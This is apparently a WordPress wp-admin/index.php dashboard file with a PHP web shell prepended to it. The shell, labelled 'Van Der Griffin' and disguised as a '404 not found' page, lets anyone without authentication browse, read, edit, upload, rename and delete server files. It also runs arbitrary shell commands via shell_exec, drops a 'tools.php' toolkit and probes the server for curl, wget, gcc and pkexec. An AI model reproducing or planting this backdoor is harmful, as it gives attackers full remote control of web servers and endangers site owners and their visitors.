Van Der Griffin
<html><head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"><style>@import url('https://fonts.googleapis.com/css?family=Dosis');@import url('https://fonts.googleapis.com/css?family=Bungee');td,th,thead{border:1px solid #fff;padding:5px;box-shadow: 0 0 10px 0 #707070}tr{background-color:#fff}body{font-family:"Dosis",cursive;text-shadow:0px 0px 1px #707070}</style></head><body><center>
  <?php
error_reporting(0);
$currentPath = getcwd();
$pathComponents = explode(DIRECTORY_SEPARATOR, $currentPath);
echo "<font face='Bungee' size='3'><h1>&#128013; 404 not found</h1></font><div class='container'><div id='pw'>Home: ";
foreach ($pathComponents as $index => $component) {
    $partialPath = implode(DIRECTORY_SEPARATOR, array_slice($pathComponents, 0, $index + 1));
    $partialPath = str_replace("%2F", "/", rawurlencode($partialPath));
    echo "<a href='?path=" . $partialPath . "'>" . $component . "</a>";
    if ($index < count($pathComponents) - 1) {
        echo "/";
    }
}
echo "</div><br>";
?>
  <form method="GET"><input type="text" name="path" autocomplete="off" size="100" class="textinput" required><input type="submit" class="submit"></form>
  <?php
  if (htmlspecialchars(isset($_GET["path"]))) {
    $path = $_GET["path"];
    $file = $_GET["file"];
    $folder = $_GET["folder"];
    $folder_name = basename($folder);
    $file_name = basename($file);
    ?>
    <script>
      const path = document.querySelector('input[name=path]')
      path.value = '<?php echo $_GET["path"]; ?>'
    </script><a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfolder"><button type="button" class="button-tools">+Folder</button></a>
	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfile"><button type="button" class="button-tools">+File</button></a>
	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawntools"><button type="button" class="button-tools">Spawn ToolKit</button></a>
    <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" class="button-tools">Info Min</button></a>
	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" class="button-tools">Upload</button></a>
	<a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=cmd"><button type="button" class="button-tools">Command</button></a><br><br>
    <?php
    if ($_GET["action"] == "view") {
      echo "<p class='text-center'>Filename: $file_name</p>";
      echo "<textarea class='textarea' disabled>".htmlspecialchars(file_get_contents($file))."</textarea>";
    } elseif ($_GET["action"] == "edit" && $file) {
        ?>
        <form method="POST"><p>Filename:<?php echo $file_name; ?></p><?php echo "<textarea name='content' class='textarea'>".htmlspecialchars(file_get_contents($file))." </textarea>"; ?><input type="submit" name="edit" class="submit"></form>
        <?php
        if (isset($_POST["edit"])) {
          $editted = base64_encode($_POST["content"]);
          $save = saveme($file, base64_decode($editted));
          if ($save) {
            echo "<script>alert('Edit $file_name success')</script>";
            echo "<script>window.location = '?path=$path&action=edit&file=$file'</script>";
          } else {
            echo "Edit $file_name failed";
          }
        }
      } elseif ($_GET["action"] == "rename" && $file) {
        renames($file, $path, $file_name);
      } elseif ($_GET["action"] == "rename" && $folder) {
        renames($folder, $path, $folder_name);
      } elseif ($_GET["action"] == "delete" && $file) {
        if (unlink($file)) {
          echo "<script>alert('Delete $file_name success')</script>";
          echo "<script>window.location = '?path=$path'</script>";
        } else {
          echo "Delete $file_name failed";
        }
      } elseif ($_GET["action"] == "delete" && $folder) {
        if (is_dir($folder)) {
          if (is_writable($folder)) {
            @rmdir($folder);
            @shell_exec("rm -rf $folder");
            @shell_exec("rmdir /s /q $folder");
            echo "<script>alert('$folder_name Deleted')</script>";
            echo "<script>window.location = '?path=$path'</script>";
          } else {
            echo "Delete $folder_name failed";
          }
        }
      } elseif ($_GET["action"] == "spawntools") {
        $save = saveme($path."/tools.php", base64_decode($tools));
        echo "<center>";
        if ($save) {
          echo "<script>alert('Spawn Toolkit tools.php success')</script>";
          echo "<script>window.location = '?path=$path'</script>";
        } else {
          echo "Spawn Toolkit failed";
        }
        echo "</center>";
      } elseif ($_GET["action"] == "createfile") {
        ?>
        <form method="POST"><input type="text" name="filename" class="textinput"><textarea name="filetext" class="textarea"></textarea><input type="submit" name="touch" class="submit"></form>
        <?php
        if (isset($_POST["touch"])) {
          $filename = $_POST["filename"];
          $filetext = base64_encode($_POST["filetext"]);
          $save = saveme($path."/".$filename, base64_decode($filetext));
          if ($save) {
            echo "<script>alert('".$filename." has successfully created')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "Create file failed";
          }
        }
      } elseif ($_GET["action"] == "createfolder") {
        ?>
        <form method="POST"><input type="text" name="foldername" autocomplete="off" class="inputtext textinput"><input type="submit" name="cfolder" class="submit"></form>
        <?php
        if (isset($_POST["cfolder"])) {
          $fname = $_POST["foldername"];
          if (@mkdir($path."/".$fname)) {
            echo "<script>alert('$fname Created')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "Create folder failed";
          }
        }
      } elseif ($_GET["action"] == "upload") {
        ?>
        <form method="POST" enctype="multipart/form-data"><input type="file" name="nax_file" id="naxx"><input type="submit" name="upkan" class="submit"></form>
        <?php
        if (isset($_POST["upkan"])) {
          if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $path."/".$_FILES["nax_file"]["name"])) {
            $file = $_FILES["nax_file"]["name"];
            echo "<script>alert('$file uploaded')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "<center>Upload fail</center>";
          }
        }
      } elseif ($_GET["action"] == "cmd") {
        ?>
        <form method="POST"><input type="text" name="cmd" autocomplete="off" size="100" class="inputtext textinput"><input type="submit" name="exec" class="submit"></form>
        <?php
        if (isset($_POST["exec"])) {
          $cmd = $_POST["cmd"];
          echo "<div class='cmd'>".@shell_exec($cmd)."</div>";
        }
      } elseif ($_GET["action"] == "info") {
        echo '<div class="wrap">';
        infomin();
        echo '</div>';
      } else {
          ?>
          <div class="wrap"><table><thead><tr><th>Items</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody>
                <?php
                $scan = scandir($path);
                foreach ($scan as $folders) {
                  if (!is_dir($path."/".$folders) || $folders == ".." || $folders == ".") {
                    continue;
                  }
                  ?>
                  <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path/$folders'><i class='fas fa-folder'></i> $folders</a>"; ?></td><td nowrap="nowrap" width="100">---</td><td nowrap="nowrap" width="150">
                        <?php
                        if (is_writable($path."/".$folders)) {
                          $color = "lime";
                        } else {
                          $color = "red";
                        }
                        echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
                        ?>
                    </td><td nowrap="nowrap" width="90">
                      <?php echo "
            <a href='?path=$path&action=rename&folder=$path/$folders'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&folder=$path/$folders'><i class='fas fa-trash-alt'></i></a>
            "; ?>
                    </td></tr>
                  <?php
                }
                foreach ($scan as $files) {
                  if (is_file($path."/".$files)) {
                    ?>
                    <tr><td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path&action=view&file=$path/$files'><i class='fas fa-file'></i> $files</a>"; ?></td><td nowrap="nowrap" width="100"><?php echo "".Size($path."/".$files).""; ?></td><td nowrap="nowrap" width="150">
                          <?php
                          if (is_writable($path."/".$files)) {
                            $color = "lime";
                          } else {
                            $color = "red";
                          }
                          echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
                          ?>
                      </td><td nowrap="nowrap" width="90">
                        <?php echo "
              <a href='?path=$path&action=edit&file=$path/$files'><i class='fas fa-edit'></i></a><a href='?path=$path&action=rename&file=$path/$files'><i class='fas fa-pen'></i></a><a href='?path=$path&action=delete&file=$path/$files'><i class='fas fa-trash-alt'></i></a>
              "; ?>
                      </td></tr>
                    <?php
                  }
                }
                echo "</tbody></table></div>";
              }
            }
          function saveme($name, $content) {
            $open = fopen($name, "w");
            fwrite($open, $content);
            fclose($open);
            return $open;
          }
          function renames($item, $path, $name) {
            ?>
            <form method="POST"><input type="text" name="newname" value="<?php echo $name; ?>" size="50" class="textinput inputtext"><input type="submit" name="rename" class="submit"></form>
            <?php
            if (isset($_POST["rename"])) {
              $new = $_POST["newname"];
              if (rename($item, $path."/".$new)) {
                echo "<script>alert('$name successfully renamed')</script>";
                echo "<script>window.location = '?path=$path'</script>";
              } else {
                echo "Rename failed";
              }
            }
          }
          function Size($path) {
            $bytes = sprintf('%u', filesize($path));
            if ($bytes > 0) {
              $unit = intval(log($bytes, 1024));
              $units = array('B', 'KB', 'MB', 'GB');
              if (array_key_exists($unit, $units) === true) {
                return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
              }
            }
            return $bytes;
          }
          function infomin() {
            $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $disfuncs = @ini_get("disable_functions");
            $showit = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
            echo "<div class='infomin wrap'>";
            echo "OS : ".php_uname()."<br>";
            echo "SERVER IP : ".$_SERVER["SERVER_ADDR"]."<br>";
            echo "SOFTWARE : ".$_SERVER["SERVER_SOFTWARE"]."<br>";
            echo "Disabled Functions : $showit<br>";
            echo "CURL : $curl | WGET : $wget | PERL : $perl | RUBY : $ruby | PYTHON : $python | GCC : $gcc | PKEXEC : $pkexec";
            echo "</div>";
          }

          function hi_permission($items) {
            $perms = fileperms($items);
            if (($perms & 0xC000) == 0xC000) {
              $info = 's';
            } elseif (($perms & 0xA000) == 0xA000) {
              $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
              $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
              $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
              $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
              $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
              $info = 'p';
            } else {
              $info = 'u';
            }
            $info .= (($perms & 0x0100) ? 'r' : '-');
            $info .= (($perms & 0x0080) ? 'w' : '-');
            $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x') :
              (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-');
            $info .= (($perms & 0x0010) ? 'w' : '-');
            $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x') :
              (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-');
            $info .= (($perms & 0x0002) ? 'w' : '-');
            $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x') :
              (($perms & 0x0200) ? 'T' : '-'));
            return $info;
          }
          ?>
        </div><script>
          const file = document.querySelector('input[type="file"]')
          const label = document.querySelector('label[for="naxx"]')
          file.addEventListener('change', () => {
            if (file.value.length == '0') {
              label.innerText = 'Choose File Here'
            } else if (file.value.length >= '30') {
              value = file.value.substring(0, 30) + "..."
              label.innerText = value
            } else {
              label.innerText = file.value
            }
          })
        </script></body></html>
 <?php
/**
 * Dashboard Administration Screen
 *
 * @package WordPress
 * @subpackage Administration
 */

/** Load WordPress Bootstrap */
require_once __DIR__ . '/admin.php';

/** Load WordPress dashboard API */
require_once ABSPATH . 'wp-admin/includes/dashboard.php';

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );

if ( current_user_can( 'install_plugins' ) ) {
	wp_enqueue_script( 'plugin-install' );
	wp_enqueue_script( 'updates' );
}
if ( current_user_can( 'upload_files' ) ) {
	wp_enqueue_script( 'media-upload' );
}
add_thickbox();

if ( wp_is_mobile() ) {
	wp_enqueue_script( 'jquery-touch-punch' );
}

// Used in the HTML title tag.
$title       = __( 'Dashboard' );
$parent_file = 'index.php';

$help  = '<p>' . __( 'Welcome to your WordPress Dashboard!' ) . '</p>';
$help .= '<p>' . __( 'The Dashboard is the first place you will come to every time you log into your site. It is where you will find all your WordPress tools. If you need help, just click the &#8220;Help&#8221; tab above the screen title.' ) . '</p>';

$screen = get_current_screen();

$screen->add_help_tab(
	array(
		'id'      => 'overview',
		'title'   => __( 'Overview' ),
		'content' => $help,
	)
);

// Help tabs.

$help  = '<p>' . __( 'The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.' ) . '</p>';
$help .= '<p>' . __( 'Links in the Toolbar at the top of the screen connect your dashboard and the front end of your site, and provide access to your profile and helpful WordPress information.' ) . '</p>';

$screen->add_help_tab(
	array(
		'id'      => 'help-navigation',
		'title'   => __( 'Navigation' ),
		'content' => $help,
	)
);

$help  = '<p>' . __( 'You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.' ) . '</p>';
$help .= '<p>' . __( '<strong>Screen Options</strong> &mdash; Use the Screen Options tab to choose which Dashboard boxes to show.' ) . '</p>';
$help .= '<p>' . __( '<strong>Drag and Drop</strong> &mdash; To rearrange the boxes, drag and drop by clicking on the title bar of the selected box and releasing when you see a gray dotted-line rectangle appear in the location you want to place the box.' ) . '</p>';
$help .= '<p>' . __( '<strong>Box Controls</strong> &mdash; Click the title bar of the box to expand or collapse it. Some boxes added by plugins may have configurable content, and will show a &#8220;Configure&#8221; link in the title bar if you hover over it.' ) . '</p>';

$screen->add_help_tab(
	array(
		'id'      => 'help-layout',
		'title'   => __( 'Layout' ),
		'content' => $help,
	)
);

$help = '<p>' . __( 'The boxes on your Dashboard screen are:' ) . '</p>';

if ( current_user_can( 'edit_theme_options' ) ) {
	$help .= '<p>' . __( '<strong>Welcome</strong> &mdash; Shows links for some of the most common tasks when setting up a new site.' ) . '</p>';
}

if ( current_user_can( 'view_site_health_checks' ) ) {
	$help .= '<p>' . __( '<strong>Site Health Status</strong> &mdash; Informs you of any potential issues that should be addressed to improve the performance or security of your website.' ) . '</p>';
}

if ( current_user_can( 'edit_posts' ) ) {
	$help .= '<p>' . __( '<strong>At a Glance</strong> &mdash; Displays a summary of the content on your site and identifies which theme and version of WordPress you are using.' ) . '</p>';
}

$help .= '<p>' . __( '<strong>Activity</strong> &mdash; Shows the upcoming scheduled posts, recently published posts, and the most recent comments on your posts and allows you to moderate them.' ) . '</p>';

if ( is_blog_admin() && current_user_can( 'edit_posts' ) ) {
	$help .= '<p>' . __( "<strong>Quick Draft</strong> &mdash; Allows you to create a new post and save it as a draft. Also displays links to the 3 most recent draft posts you've started." ) . '</p>';
}

$help .= '<p>' . sprintf(
	/* translators: %s: WordPress Planet URL. */
	__( '<strong>WordPress Events and News</strong> &mdash; Upcoming events near you as well as the latest news from the official WordPress project and the <a href="%s">WordPress Planet</a>.' ),
	__( 'https://planet.wordpress.org/' )
) . '</p>';

$screen->add_help_tab(
	array(
		'id'      => 'help-content',
		'title'   => __( 'Content' ),
		'content' => $help,
	)
);

unset( $help );

$wp_version = get_bloginfo( 'version', 'display' );
/* translators: %s: WordPress version. */
$wp_version_text = sprintf( __( 'Version %s' ), $wp_version );
$is_dev_version  = preg_match( '/alpha|beta|RC/', $wp_version );

if ( ! $is_dev_version ) {
	$version_url = sprintf(
		/* translators: %s: WordPress version. */
		esc_url( __( 'https://wordpress.org/documentation/wordpress-version/version-%s/' ) ),
		sanitize_title( $wp_version )
	);

	$wp_version_text = sprintf(
		'<a href="%1$s">%2$s</a>',
		$version_url,
		$wp_version_text
	);
}

$screen->set_help_sidebar(
	'<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
	'<p>' . __( '<a href="https://wordpress.org/documentation/article/dashboard-screen/">Documentation on Dashboard</a>' ) . '</p>' .
	'<p>' . __( '<a href="https://wordpress.org/support/forums/">Support forums</a>' ) . '</p>' .
	'<p>' . $wp_version_text . '</p>'
);

require_once ABSPATH . 'wp-admin/admin-header.php';
?>

<div class="wrap">
	<h1><?php echo esc_html( $title ); ?></h1>

	<?php
	if ( ! empty( $_GET['admin_email_remind_later'] ) ) :
		/** This filter is documented in wp-login.php */
		$remind_interval = (int) apply_filters( 'admin_email_remind_interval', 3 * DAY_IN_SECONDS );
		$postponed_time  = get_option( 'admin_email_lifespan' );

		/*
		 * Calculate how many seconds it's been since the reminder was postponed.
		 * This allows us to not show it if the query arg is set, but visited due to caches, bookmarks or similar.
		 */
		$time_passed = time() - ( $postponed_time - $remind_interval );

		// Only show the dashboard notice if it's been less than a minute since the message was postponed.
		if ( $time_passed < MINUTE_IN_SECONDS ) :
			$message = sprintf(
				/* translators: %s: Human-readable time interval. */
				__( 'The admin email verification page will reappear after %s.' ),
				human_time_diff( time() + $remind_interval )
			);
			wp_admin_notice(
				$message,
				array(
					'type'        => 'success',
					'dismissible' => true,
				)
			);
		endif;
	endif;
	?>

<?php
if ( has_action( 'welcome_panel' ) && current_user_can( 'edit_theme_options' ) ) :
	$classes = 'welcome-panel';

	$option = (int) get_user_meta( get_current_user_id(), 'show_welcome_panel', true );
	// 0 = hide, 1 = toggled to show or single site creator, 2 = multisite site owner.
	$hide = ( 0 === $option || ( 2 === $option && wp_get_current_user()->user_email !== get_option( 'admin_email' ) ) );
	if ( $hide ) {
		$classes .= ' hidden';
	}
	?>

	<div id="welcome-panel" class="<?php echo esc_attr( $classes ); ?>">
		<?php wp_nonce_field( 'welcome-panel-nonce', 'welcomepanelnonce', false ); ?>
		<a class="welcome-panel-close" href="<?php echo esc_url( admin_url( '?welcome=0' ) ); ?>" aria-label="<?php esc_attr_e( 'Dismiss the welcome panel' ); ?>"><?php _e( 'Dismiss' ); ?></a>
		<?php
		/**
		 * Fires when adding content to the welcome panel on the admin dashboard.
		 *
		 * To remove the default welcome panel, use remove_action():
		 *
		 *     remove_action( 'welcome_panel', 'wp_welcome_panel' );
		 *
		 * @since 3.5.0
		 */
		do_action( 'welcome_panel' );
		?>
	</div>
<?php endif; ?>

	<div id="dashboard-widgets-wrap">
	<?php wp_dashboard(); ?>
	</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php
wp_print_community_events_templates();

require_once ABSPATH . 'wp-admin/admin-footer.php';
  
